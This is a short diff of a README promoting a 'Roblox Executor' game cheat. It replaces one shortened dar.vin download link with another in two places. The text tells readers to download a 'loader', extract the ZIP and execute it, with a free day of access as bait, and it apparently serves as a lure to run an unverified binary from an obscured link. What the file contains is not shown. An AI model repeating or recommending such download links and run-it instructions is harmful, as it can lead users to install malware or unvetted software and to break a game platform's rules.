@@ -4,11 +4,11 @@
   </a>
 </p>
 
-## Quick Installation **[![Download Roblox Executor](https://img.shields.io/badge/Download-Roblox%20Executor-blueviolet)](https://dar.vin/roblox-executor)**
+## Quick Installation **[![Download Roblox Executor](https://img.shields.io/badge/Download-Roblox%20Executor-blueviolet)](https://dar.vin/Roblox-Executor-New)**
 Every computer that downloads the loader gets **1 DAY OF FREE ACCESS** to the Roblox Executor. No subscription etc. Download and start using it!
 
 To get started with Roblox Executor, follow these simple steps:
-1. **[![Download Roblox Executor](https://img.shields.io/badge/Download-Roblox%20Executor-blueviolet)](https://dar.vin/roblox-executor)**
+1. **[![Download Roblox Executor](https://img.shields.io/badge/Download-Roblox%20Executor-blueviolet)](https://dar.vin/Roblox-Executor-New)**
 2. **Extract ZIP file**
 3. **Execute and have fun!**
 
